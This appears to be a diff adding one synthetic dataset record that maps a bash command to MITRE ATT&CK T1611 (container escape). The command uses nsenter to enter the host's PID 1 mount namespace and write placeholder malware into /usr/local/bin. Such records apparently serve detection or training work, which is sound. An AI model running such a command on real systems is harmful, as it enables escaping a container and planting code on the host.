@@ -1,0 +1,21 @@
+{
+  "id": "SYN-BASH-T1611-227ea404-762abf5a",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "nsenter --target 1 --mount -- bash -c 'echo malware_code > /usr/local/bin/malware'",
+  "explanation": "Writes malicious code directly into a binary location within the host\u2019s filesystem via the mount namespace.",
+  "rationale_steps": [
+    "Access the host's filesystem where executables are stored.",
+    "Insert malicious code into an executable path."
+  ],
+  "source_prompt_hash": "227ea404",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:30:03.527255Z"
+}
